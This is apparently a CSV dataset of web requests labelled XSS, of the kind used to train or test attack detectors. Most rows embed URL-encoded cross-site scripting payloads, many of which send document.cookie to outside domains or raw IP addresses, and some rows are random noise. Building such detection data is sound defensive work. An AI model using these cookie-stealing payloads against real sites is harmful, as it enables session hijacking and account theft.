id,class,vector
2426,XSS,/a8ktstntEnas/npHEG41Z-p9hQxp/ehBXDRPiD7/nih/dhtoxx82lzaaard/ivt1aeBmpw8snr/anS/pnece2uertm/s84eboatrkNsceahsu.exe?eg6b=352&ktao7rR=kS0csunleogeene&uppwyt0deaaeius=l%25b&WMacceptws0cmW9r=%3Cimg+++src++%3D%22++++mocha%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ge.com%2Fcgi-bin%2Fntelch.cgi%27%2Bdocument.cookie%29%3B%5D%22+++%3E&obnelwe=f8v7upZS&Sbwirgs32o9hdi=%2Fxterm%7Exc
2448,XSS,/o8aQeeotyep5rIw/nInfpme3_SgO7X/hn/eJ@xegtHGOdJ26apFPZD/omATHoAT2.x/ta/sitnis/kgdntHuiorn.asp?dks=gita&c9ntipau=tPCQ6O&TbfFh3=catu%5Dse&adnbs4eSain47e6=eiy&tpbma0njsdc=tl&nsqnnecenTti=Ps&seaDlFt0l=y+aLom8p&6beuTanelntu=iicpee
2468,XSS,/03FohomejR/oV.cgi?m4doOeAes0a=44989162&o2e=rmoteGosn&dor=disEbdi6t3broSmdue&eeen6dhsamSp=inP12&fqbsa8eeTS=743919
2478,XSS,/eXr@@AwEEMv/lsReeotuf/dtholvdascElm/seeaO7icjet/kre0unecSalahfutl/ao/Sne.asmx?1gKhees=1731611331&i8AesBh=%3Cdiv+++++style++++%3D+%22+++++behaviour%3A++url%28%5Bhttp%3A%2F%2Fwww.arra.com%2Fscript%2FotAon27he.php3%5D%29%3B++++%22+++%3E&buIDN48K=3976523164&eDhonA3=hX735&sI0a7=9&sidnaapri3ecn=lcr&gtEberanl=8866919&aynoodei4t=replacev&eeialm=e2HMrLwOpm&yiodp=058649&iqnb7etletlntna=s%24scncpylis+a
2491,XSS,/.FSGX/tJ9q/i9aios/Jhatpmtilatn/inHa/NioliyMi/kho/ate/nsvGUHYlM-o.php3?CxXB2RVj8b=t&8nIn=w%5Dlic&edywtprneaszoi=3833528&BZ8uRMxmlservices=126245&lhulikeY=%3Cstyle+++%3E%3C%21--%3C%2Fstyle++%3E%3Cscript+%3E%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.tiitte.com%2Fcgi-bin%2Fmelies.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript++++%3E
2508,XSS,/e7ESoWSri/R90akgCYnshutdownI90MT/NsinbmiTse4errotEdv/geoen.jpg?4dYrwft=5237677&oiqd9dly5ovihe=%3Cmeta+++http-equiv%3D%22+++++refresh+++++%22++++content%3D+++%22+++++0%3Burl%3Djavascript%3A+%5Balert++++%28%27ni%27%29%3B%5D%22%3E
2518,XSS,/pxebaltos3oHth2sh8oa/yX/enqdr/rltti88Tbyly/7lb5IjfIxBGf/hciay/FAqxp_lH0e7hYr./nlQgrac.gif?ryne2s7=90970302&itihssfdrgda4wo=%5B%5CxC0%5D%5B%5CxBC%5Dscript+%3E%5Balert+++%28%27onCf9%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript%3E&sdzmhl0ZchEtry=62729478
2525,XSS,/adwtenec4riioed/urroiut1tsti/gstbi6esaen0e4ueo/iEhmfi5eotwn9o97ttfl/aInBdB1/hWVjRcG/tuowuionxvaf7ihole/o1eu7/RoTdiojecg.css?t6fmtsel9hnels=6796&pHTJKsUFaz9=%40t0ds&Bel=%3C%3Cscript+%3E%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.nede.com%2Fcgi-bin%2Flionil.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E&t5ngHEowsEavml=4sfTrAf68dxo&4nard9deabg=t&VWWe=9714779
2535,XSS,/JD/4@-_k/QpsC1SF@hG6ownBB/cice/i@x3YHIzCIXT@.mdb?Eyjqe8tsncey=n%3Deta&ibSakinh=65&biy6D=mm2.x&lq3uheir=khqe+mtformso3S&beds=%3Cimg+src++++%3D++++%22++++javascript%3A+++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.mare.com%2Fcgi-bin%2Fal.cgi%27%2Bdocument.cookie%29%3B%5D%22%3E&twltede=escqmsnry&EdhOdLnele=mte&0rL=rdLSX&lie=i%40A6aXs&ohejar=betweendft5oascr%3Ddn%25i
2538,XSS,/ousDYfTXrifCNdr-xKC/ibNe8Tv3Jds/yCnt2hhWhrOaaPgsl6g/ee1MR_LdKgFJd_Dv0/vXd5020K_73Z.js?he=7440&T@01nhezjph=6.6b6yVo.6lC&lYeJFintheeEi=%28%7EHevala&nciD=b61EmJTy-6F2&yfunI2to=sTrU45&8nqtssnlReu5nn=uiAa&ed5hndh2Mhea=742095&rte=f%3Dct&rdy9i=t1Jqrt8&lodMi6aold=%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F66.215.203.245%2Fntel.php3%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript+++%3E&ap5tlt5nj4neio=e%3En
2551,XSS,/oDCAPBEo.KN6eb83/ey/aHXqeiDIWX7J/i_AusEx1-fG6/a@U/6tesP/9_4zvT1Y/kpTjnAi/hjEoHshisau/eylI/iiCfAlh4nrrsjni9emva.swf?c2maieins3c=ps&0kcheeo=7+replace%3Ed3uD&PT=us&psMevalsexec=So&0n67acrlhaxep=eu7NtAr2T_&rts=a0KSsG.S&kieeernetee=ioyae&iedtoaCS1=%3Clink++++rel++%3D+++%22+stylesheet+++++%22++++href+++%3D++++%22+++++javascript%3A+++%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.rionli.com%2Fcgi-bin%2Fnsiest.cgi%27%2Bdocument.cookie%29%3B%5D%22++++%3E&rS912VvlsYk=4530088932&mihcbg=%5Be%24eao1n%2Baaa&mmrdkaean5udhn=Soxaeahsatle
2557,XSS,/g2C5AIw/i9Y67/itiDl/f8gY-sTgq@e5.jpg?tel3Iwuc=792&hcuee=gceEtiv&catS=nile&sock_stream.VqRazoNR=17906&9Q0CZi=716864616&d40gseho=82&Nv=o4nyn%7Ewget&hmazrmnroite3a=systemwinntlinkr&treplaceVvfe72form=hiR2&clstrwh=04&ttsodroeuteff=4298&l2tiov9ae9nWtv=%3Clink++rel+++%3D%22++stylesheet++++++%22+href+%3D+%22+++++javascript%3A%5Bwindow.open%28%27http%3A%2F%2F126.21.32.6%2Fnsorre.jsp%27%2Bdocument.cookie%29%3B%5D+++%22+%3E
2561,XSS,p9IrzYep5=u]s &zjfjrPGa=wahoSeOc4B&EliE1d5Drdewno=5tepnet2e:~mL&wn=Tsowherew&eptjc4ncE2oouf=6153&itEtiSumuskt0r=aGVh9KT&d92T0rjalfn= tade64aehb&auetf=gnnmTegetTnltAIh&ItTgsielizien=3017522&dh2lzeonpyf=dzrhixfieqamydf
2566,XSS,/o7emi/3zcLpinput@g7C9KS/f53Bzuto7hOb/PEC_dlcK7@/rio0bsgnD.nsf?iys6aAiio=%25iwp-e3&rhtohoi3=8i&aoee1tlnaeel=936&ne=m2er1DoypeY&eva=75&NrnnweMteaeh=850&nEenfeIo9hylee=4srie8&5shaze=9f3r0teoe4tdo&lnhrt=054806461&tihgraauyfb=870805808&aq60J8eHte=euvg&55llelqr=xrnqBsNm&NHScrhnrauDeoeu=ooY&olta=fxvooahnisr5p
2575,XSS,/.xmlaF8/7zwlxaTm-8Fe/sbQ2XeWILCZT2SUU8M.J/vaEhd/afhE/aAsl8jWHi8@2Qf/uue9sehdzAu3lkr/oweitMrhesemuo.jsp?4OiZ1yltmp=e1pPJNc&jesk8dnt=e%40eLe&iit0tabsflrv=thttymfweOan1&QpqleWb=0921&lohaslnelcetlse=a6l6n&Er2ubPheSsfr6k=33496563
2579,XSS,/G3aE4documentufXW5/adktap3Sypw6r.htm?W@Uinsert8XjrbpsW=%3Cform%2Bname%3DtstSl++++%3E%3Cselect%2Bname%3Dsexm+%3Ehttp%3A%2F%2Fwww.wig7f.com%2Ftfd%2F%3F%3C%2Fselect%3E%3C%2Fform%3E
2582,XSS,"m7tt7dhhitow=yh2vW&enetyi8jlsct9e=7Ujnat5di ab9tt&9noaOaonridsm=<meta     http-equiv  ="" refresh     ""  content  = ""  0;url=javascript"
2601,XSS,"/""><img"
2602,XSS,/eP1QR0hi9.o0CtAE8c/hylOetptr/v7aeebe.asmx?9TUBUQscript=13167853&Av=%3Cdiv++++style%3D+++%22+++++background-image%3A+++url%28javascript%3A+++%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.litrmaal.com%2Fcgi-bin%2Fllattianas.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B%22+%3E
2607,XSS,/t07mPuuWK_B/fdrdtO2nNtwauo/ht4ngkiec/egzO1hjIHG/bdGJg6e91kIgbY0./srX2gLGv3RavHI/lCyRzaUQnYmR3Em2/3deNit.swf?vdbe0lme2ernel=eVqySPki.-Gh&sAE3Vgn=fp0&jreuetosshN0e=%3Cmeta+++++http-equiv+%3D%22++refresh+%22+++++content++++%3D%22+0%3Burl%3Djavascript%3A+%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Fristesitin.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22+%3E&eoOi=lumebklehctlo
2615,XSS,/1xnsSgNGv9WO./rKOYK/rtbgsoundfrom/ygeNpon7/update8sgJy5PRcUp/8BZpkznuJoYF/naGhaKkPnafn85hepTW4/LM/6nitEocjoEenUg/T7LmLTikP.jpg?f47w=%3Arn&oNxZn=65830&sim=5u&Q7boot.iniL4EU=%3Cscript%3Ealert+%28+++++%22++++66rrd.vfamd%22%29%3C%2Fscript%3E&eda45t=thds%5Dy1&Hu5ILy9fp=666329&Ael11group
2626,XSS,/smochaopFzP9/nfa/pt7pie/da9EAaMPD21vc/iVWf.kiWYwJhP/hiesfebhhnjeeUsq/URLselectSimscript6iWY/cLMX2Ksq@IselectLcopy-O/tGWv/l.I0CxTELzusvQeshf/a8YKlXOem.mdb?ooEhpuhn=ylqetaohtacces5all+childzye+aC+&inae5tce52vgh1t=15081&Svgq2jzbjs@=mriA%2Fl%29%5Ciuosrnn&ptvrn=aahehtacceshutaoo%2B%24nhtaccesau%3Bei&t4ct56oSao=6eA%3Betplrcp%3Ceoodi&okuaccrota2i=%3Cimg++src%3D%26%7B%5Bwindow.open%28%27http%3A%2F%2F249.183.2.238%2Fngngsi.php%27%2Bdocument.cookie%29%3B%5D%7D%3B+++%3E&huliltn=23&rwsia=trnpytea&sayMearogfli=nfauot8ubTet0hseMe&neaNieoptivulg=l%3Cir&otR=oeoRchprk&m74=8520&konxheryni0sotn=312273&ihinzfhh0=duutI
2643,XSS,/JddDii30iSm/4Npj/oh0ek4du.mdb?ihsloia=ircbErhqrh49rru3&amdTbeAoK=%3Cimg+src%3D%26%7B%5Bwindow.open%28%27http%3A%2F%2F212.28.124.23%2Fng.asmx%27%2Bdocument.cookie%29%3B%5D%7D%3B+%3E&fnrthrdiyh=drB7h&juedoshioan1h=las&nu3es=2809957445&8retowhsI2raa=bpoefNl&RiiceIat=7&snEoaRi=s&uxopdepr=841067683
2656,XSS,/dl5D07YhsBmu/moOstIoactfspo1hi7/20Ymt/eunuazvkhy7mC0es/eunionailinkSPuUpD/ahA4oc0/daeroqeEiata1/qfF7GLmNA/SPrinputXoJ_.css?gconnectEmdhJj_=rpnzeihtb&htj3s6moio=74831&5llitDi=e9ktHEEwotl0yGt&neeapphsue=%3Cdiv++++style+%3D+++%22++binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.itet.com%2Fscript%2FEnohlS9c.mdb%5D%29%3B++%22+++%3E&twsme=ra+e&ipcMerot=302996&gu7ux=aa&tpt=4666799&ulnsnatugepehTj=efs3aeEfq
2660,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
2673,XSS,/iymD4mpd2MgtvhrA/tR-aIqW@C84/eh-HBUzFU0V/E4LOAa2qN_UQjil/y7xf3Q0L6Z@yfpn58/eLaWEv/1heerqh/ZRzmFDVlikeJ.css?hssn=%3Cimg++++src+++%3D+++%22+++++mocha%3A%5Bwindow.open%28%27http%3A%2F%2F239.185.162.94%2Flion.jsp%27%2Bdocument.cookie%29%3B%5D++++++%22+++%3E&lajet1pfsnbezvo=ay
2678,XSS,/aeuUeDsmHrsf6erd/tQcDYF7BAeM.sDL3/2DaN/nmnilhbalfbYnemouAb/gyaslaity/IMaB-echobinl.Cybin2V_/xQwindow.openbD.ecYJv/viiEEdrcdugtnoo/HletanslnFxNoj.gif?JBF-L=024&b9=htpassu%26scriptt&lib54selectF=x.0iQ&a9=etttitelhiygY
2681,XSS,/Qogmu6d7lLerdea7eM/aonkieemlauolkrej/6gXxmElxVU.htm?@PZ0a@vdCxp_Xhtpassn=MXLxuas837McDmcart&Atrmm9nhibn=kC2dh&iqcrugymjtrme=159615017&ms=%3Chnae%3As%3C5li0i0ns2n&m1seSusytnne=638939242&zPZI=k%7CscoszF&im=lae%3Et&ssosh=+TLre+aoo+hb&tpStrt=%5B%5CxC0%5D%5B%5CxBC%5Dscript%3E%5Balert+++%28%27euneg%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript%3E
2690,XSS,/gczBRuW5/noudnlIrajc3ke/wiIwELHHP/o6o1z/1ditctit9iuptiwd/ydR9ps-gde9vq2Nnd.swf?fostBioE=X%28o5oncexecaccess_log%2B&Apfrom3v8R4h=emlh8oeteieiesaaa&taaccq=694027&loada=n%3Ecd&IT2sno=%3C%21%5BCDATA%5B%3C%21--%5D%5D++++%3E%3Cscript%3E%5Balert+%28%27rz3uk1%27%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E&lea=thc&tmpg-vHHew=Isag&mun=9&allTDzRBXxtermcmd0Ud=%7Etnode&ZnKLvv0@K.u=e%5Con%2Bo1zr&yetshcewo1r4t=790891357&hGallS=rinzoE6iHyt&n4BKevalPg2L=510&etdzasge5nig=668794
2694,XSS,/do/Ivrauirv3cktin.php?tuesTdno=%3Cmeta+++http-equiv+++%3D+%22refresh++%22+++content++%3D%22+++0%3Burl%3Djavascript%3A++++%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.stmeng.com%2Fcgi-bin%2Fre.cgi%27%2Bdocument.cookie%29%3B%5D++%22+++%3E
2695,XSS,/d5i@valmCeS-SX/wO9f5oudrxleryeirrr/tys@nZF9/nndtm/eunn/Hu5hdcWt4zr/NJFandMpsi./6I52@m.nsf?
2705,XSS,/e_hx/r2qOBOWN7x0lMUiwg1sD/gxBxx9kqQyaj/ivDo/r9w8wocllaxe/UlA@Jq7/pa/nUX@JrxvqpK/bWShjG-3VHPhyR_mbeWQ/l08xatGdoag0/aD88Pfdb9J8dnWRLv9.css?
2707,XSS,/.X4zRA5/7vrWCpHJ0U7yFfBG/lOQzy4dUK1ORc7g8VxG/5o5/w-4IIb9phm/yncg/lACLp2hisMCbx/qU/h9.php3?tetkg6YssOQai=672932222&Iefh=%5BEt0dl%28perlda0diecho1li+tcr&8iiqaZa=5042&sH=+isC&ni=bevalopositionaatabinaahiL&on3=rrtsh8ihlh&ae=%3Cimg+++src++%3D++%22++rois++%3E%22++onmouseover%3D+++%22+%5Balert+%28%27eio%27%29%3B%5D+++++%22%3E&t1mytE2alerT=7
2722,XSS,/oJ8wN_4fwIAju5ps7.mdb?m8eRaaTe=466451&zebn0=erauoltaoo&qtmeibGuni6=%3Ciframe+++++src++%3D%22+++vbscript%3A%5Balert%28%27ts%27%29%3B%5D++%22++++%3E&5QwtDDP=7187935&GnodeVO=cluI0mX
2725,XSS,/aV1F@HzJVgOtAPx/vBmrE87I/raFv0nROju6p_VzC5zhJ/e6cc1H/v._mUOsBc/2escriptj.qObS1qtC/mq7/tam/mt/amotIUs/iqgsirtwlt9/m67R.gif?os6xtTNcrt=ni&ieeilosrhqzrrAW=al&nwvooettdtnehr=%5B%5CxC0%5D%5B%5CxBC%5Dscript%3E%5Bwindow.open%28%27http%3A%2F%2F133.102.140.53%2Fsi.cfm%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++%3E&xa=tprocessing-instruction
2732,XSS,/dc3mi08rt/KUsgsHnAat.asmx?16ROPK5=548448407&VB6@MOVL=22097&5asatrft1n=htpasst+Ce%29%7Cntlt%7E%3EaTt&vFrMIbody=eAIMqMv&n0dttfoeepytns=98952040&sgl=6services&1wttvNnnri=rz5&atge=ue&ucj-zxyNfPz=7308414&ee3rbbanyun=030203&jdoLIN65I_c=31702
2739,XSS,/rhSPXjI@S/ihylBWo8U/vA1gDRt2@Vc6Ymr/atixafNomPnKen1Yenun/9dgAAFJ2ANRQPF-.php3?AdPcat.=amaie1jSmie&i65ereAascun=e2HbXt&thf9Ey=2919&CBKnsamr=ob%40mj%24nuobx%24fs0&esvc=8&ZDDBdcG=nisnncattk539aE2&pnLtx=uD%25+ftnnolkee0h&NsEostdinq-xL6Tt=%3C%21--+--+--%3E%3Cscript++%3E%5Balert%28%27sstxhnam1e%27%29%3B%5D%3C%2Fscript++%3E%3C%21--+--+--%3E
2745,XSS,/L7.-BzWWcagGiP/eeon1/am/aaesecriphak7era7/hL.rSkrXHVhWjebQ/emboe/mlar2eno/0srlbta/myN/rH6l5-5dzPzDLR3QM.jsp?nppauhireqeWd3p=teci+l2m&loimogn3E=15189&Ah4_5mL=%3Cbody++++onload%3D+%22++%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Fseri.cgi%27%2Bdocument.cookie%29%3B%5D+++%22++%3E&sj=e2%40_pU2VE4&qagwvrltu=%27etNgrA+oca5rnwindow.open&tHBinsertnph-AZV@=arQidzl5nAF4&c6=603
2746,XSS,/snAsd5uEibsvtgpz4/07honoDrr.5/dzTaOGSvbscripte5Mopen/HdeleteIhEservicesuTICx/eksexwnhe/aZlOH/t7l/sdewaaeaNhesi/adteml.mdb?toutsbw=s%7Cdppshtpassiovbscript%240ncmdLN%7E%3Fos2&uacro2e5dhrm=yl09ott4eicm7ieF&uEe=iaeAu&hmeettE=%3Cxml+++id++++%3D+%22+X++%22++++%3E%3Ca+++%3E%3Cb++++%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F184.46.152.116%2Fstas.aspx%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb++++%3E%3C%2Fa%3E%3C%2Fxml%3E&nnXelth=573&esere9=Al3&hyml283n4tW=rfsstyleinput6tfankemer
2762,XSS,/WhttpshGWX5EellVVLD/yG6uSHtTs/tXvI0MRZjMvvhv3sb/teslktnnfome9r1rhh/BuinputB46@bOJ6N/hvh/lrtxE9IhasGodi/cc/Yotaadpwfnz/he.tiff?uNt1ilOekth=3686&pasapncRpd=tQXut29QU1.w&aauLbijuni=kegorb%5Cos++gtnseur&ohAiai=%3Cdiv+style%3D+%22++width%3A++++expression%28%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.icge.com%2Fcgi-bin%2Fni.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B++++%22++%3E&idthin88dhrtdf=82628981&5OQQY6k=ro%3D+vNqe88er%3Cxp_o&eiB5neso=g1wvBiijZ7&ihaving6pXukJ=kutsr&ok9et=StDeeee4twt&lbietaxetf=dQ2aD&openMk6R-Punion=743026&IRECRbD=426948&nmanm3s3snstnwc=3nueg
2768,XSS,/sg6wBrJgl-bGuaS.cfm?QJMAobject3orN=%3Ciframe+src%3D++++%22+vbscript%3A%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.tr.com%2Fcgi-bin%2Fti.cgi%27%2Bdocument.cookie%29%3B%5D+%22++%3E&tytxaseuto=790661&enisyomu=o&1aadebacqn4=tkze7imranekpv&khehm=Fl&rRoUsn=dad&dtantNntii=%3EeIh%3E&te4iszrrs=91039&PQQkuGr1v9T=34284&enrobbItU0dte=iFp7W2EVg&3te=awsse&l8giiipduoaht7N=Nt9e&7oatg2c9=og
2773,XSS,ieisliaDeoir=tyo5vionA&o6eslsgunLayz=ahood&u4mnv9s1e=nrpeciHcr&3dcttenA=996&ir1td=o8&shNrdtt=wTM-mtsfIwWc&SHV_5pph_X=nsub&lc5eei=4738
2785,XSS,/mk_UNN.nu9A/f%uhomeagw/hgst8sqswn9/45temvest2ncdsdH/ertreC7fh/AE7VURSRz/n8l9@3H55/xOI_uj5bYWPRSc/a8s/N7kr2nt/@CGIZ/eU5.sh?sE3eeiaStrpsueR=%3Cobject+++classid+++%3D++%22clsid%3A...+++++%22+++++codebase++++%3D++%22+++javascript%3A+%5Balert++++%28%27cn%27%29%3B%5D+++%22++%3E&OperlBJj1Wf1=due&rcon=q-3Y9Fy7l&ilkta=y%25s%5Be&fonpcmIthlu3cp=095&weoserSI=%3Eo&toodslobn2=5%3Daea5srnsih&aiT6eoeeafp=an2all&RpaMu=afea&donx8lwime=eati&ttttut1=dada
2786,XSS,/tVwJHYxW7T5ess/eG1q@kebEuN.9IjPqr7/Yw4yEJ..msf?rprgfwne3seov4=361415&Scat=22332&rAwt=aKP&gOe=046&hunmtane=aSe4+h+d+%28
2792,XSS,"K1olq=  rhgme g1\)[&n72St8dctsh=246676&tdlradaiew=0161216&rwpiinaimqsern8=GpEiElpcntneyf&xie4onnkmeGLto=6&hnrBjlhrdue=<div     onmouseover  =""   [document.location.replace    ('http://www.taelatit.com/cgi-bin/ininro.cgi'+document.cookie);]    "">&4lYx9zBSoWS=ai"
2802,XSS,/ob/OwEcsaiE/hGEgJAF4Yz/iteitiiT/M0tDhDuHt/ks9eTtAsloikDxtiebl/9efetrMnpNk4hn2Es/bvGgqa7y63PK_/QXsNhJpN/hSmU._ytJlw/csly.php?masrSaaoetvOn=5725915&endwfe=fnPATPvQt3&YHghomesock_streamhtacceslMwuJm=o.h4Qo&eadlae=o8uw4YfxXa&gue=eeelvllree2ehsttcC&kbeeon=%3Cstyle++++%3E%3C%21--%3C%2Fstyle+++%3E%3Cscript++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.elmana.com%2Fcgi-bin%2Fal.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript++%3E&abajnulpp=iimg%27tt&mdn1=skA&gestr3imeiw=10&I6n8Q0o0tcnne=A+aefh&t1i=+1j2&bcBN7ySwSVXG=24%2Fre&_Hu.o2RhOpprocessing-instructionr=gkob
2824,XSS,/rR/eethlclTptmdhnmqs/eweciriAred/aGB2bG.@0WNCv0eYN1J/r-/efd.YVGEFNqd@gb4y/sGwAi6se6naewhb/fpas8/cDtaqvSpuE-ewi/SQwa47Wyekmocha59e8/9kisSvigCpoWYO/tvpbFqxxhcaf4VK.ZauX.php4?cTRn=16&FFp60ue=061&p7xoiond=li%3AF&tmUu=io&s7=6a+a1e+%26AeOgafirh&D9mgrnx4jly=ts%3Eeb&7EhttpsdocumentH=oEsa&4t1a=9112105&jfv@JJofGl1=%24%2F%5Bio%7Ecek&jmu1suwg=2134856&Eaui=itqsn&ofqkeiwao=%3Cdiv+++++onmouseover+%3D+++%22+%5Bwindow.open%28%27http%3A%2F%2F17.130.182.222%2Fattrar.sh%27%2Bdocument.cookie%29%3B%5D+++%22++%3E&wMEu0dtul=79275617&n7eIxretsntno=769120&ssaozhorhalddu9=s%28d+
2829,XSS,/aiXlYfjbW/bOYvbscript8mAf/Y_IPq.tiff?q55bBR2sYj=1&eerreanosnoc=qciaaed&e0=eaauut9nggn&qnieearhtxr=%3C%3Cscript%3E%5Balert++++%28%27raahcmjN6t%27%29%3B%5D%3C%2Fscript+++%3E&ts=44835&sm2hDsef=o4k%3F&Llorceni=5oe
2831,XSS,/tthti2adepi.php3?solnovetx9=36877586&Lldcay=k%26&oils8a=skrtrntleosiiWdcsh&AorcUoYiytlxf=pjfu&553N0Lwindow.openB=6%24fnn7W&n2xaeUretar=%3Ca+href+++%3D%22++about%3A%3Cs%26%2399%3Bript+++%3E%5Bwindow.open%28%27http%3A%2F%2F34.122.116.189%2Fieling.swf%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E%22++++%3E
2853,XSS,/ba/h1CWfl6@b10JnC4WfLO/wHTru/uj8gfofQ/ntwhis/iF.l/moatoocNczwlfy2tslrl/c@iEd_38Ih.NX.cfm?beoeasimbXeLyb=erldiie&37usyotcgic=557&palshtear=jmun&if6nsSo070te=bsiEe&uoA=smu6N&000CAtmpkHrcpHZwinnt=658&oethiagoqla=%27%5C+iJu&aa=b82kvQI_cwN&isamcp=%3Cimg++src+%3D++%22reattrllil+++%22onmouseover+++%3D+%22+++%5Bwindow.open%28%27http%3A%2F%2F63.120.50.144%2Folrase.pl%27%2Bdocument.cookie%29%3B%5D%22++++%3E&fncoudvliedn=l&aidut9=nbgsound+n&re=ewLO7o.AdTl.
2854,XSS,/aX30uO5DWwvMu0z3jE3D/sPkbsAsgahcNqaewa/5he3imni/af8opeauohlwadomidOd/sf7K4BGmj/8Ltjnqsgso/e9J0KskQeTb/aJEmK/eteflun4rs/bt8hb/ilnhanpsAfqitt/xXzrOYqqAnfr-8.js?hb=%3Cimg+++src+++%3D++++%22+++mocha%3A%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.vest.com%2Fcgi-bin%2Fel.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22%3E&ptrojhisso=120
2859,XSS,/ef95i8MBObCKi/tzbFiDKXuh8jc/Eictbt71opauu/iaoasrcceeieh7cee/ot/oCDDz2pjVy9vClQ-/27XUCJ-v/fgzKRdfi7MN/e0@-xCS78txZ9s1z/idCLkZHGa8aA9h.pl?aqaq6oeFnieeapa=sPsy&tuab=%3Cinput+++type+++%3D++++%22image+++%22+dynsrc+++%3D+++%22++javascript%3A+%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.onre.com%2Fcgi-bin%2Forning.cgi%27%2Bdocument.cookie%29%3B%5D++++%22+++%3E&Zol3lyEuTn=-s&s4sae0pchnh=sen&sT=httpi2eaib6+8co&aedNoce=ia6CwEio
2866,XSS,/tpm/oswhyheu8u8doUe2/motl/It3YwWC0W/object0aor4Nx/rMPO/tt9Ga3/xS/l9rW7qSOd.exe?a6oMhyng=iv7onzt64hizO&Rer=%3Cdiv+++onmouseover+++%3D%22+%5Balert%28%27elB%27%29%3B%5D++%22+%3E&eo=rugdusteyyrrDs&srdsyelece=tFPw2&tnncuapseacou=skac&Pousrqx8=oht&cZn8SndV=wJepLzkdroH&rtivur=h++tb%5Cylynf&bhpcuuhwhifsn=4701119
2871,XSS,hlntg4thuiqfRib=16&2iTnwr9lshe=76669&@.h-0-@=iSTCdBSzcr4&42zautoexec=radaSn
2872,XSS,/8d/5aull/htpassJd/ct/tJaoSpBEXrPrDpDY5YpN/eoco/0ZosNZO_ytY2ENwouml7/cBBmU8n/e7aqttoep.asmx?rgoa=%3Cdiv++++style+%3D+++%22+++++width%3A++expression%28%5Bwindow.open%28%27http%3A%2F%2F15.15.113.106%2Forme.msf%27%2Bdocument.cookie%29%3B%5D%29%3B+++++%22+++%3E
2879,XSS,/<SCRIPT>alert(document>URL)</SCRIPT>/?
2884,XSS,/<SCRIPT>/?
2885,XSS,r9eeemdtbteaa=yfjueTbo88H&ha3aaentIr1=Ht4S7>sd&eoormge=wqtn9Y&alierhet=pfotsoneigssomnn&ZfhphpF=7 afi&igehcsayoot=xway0ddia ftptfroms c4pm[r&hx=34900&rsat=h0iz0nJ Cqcw
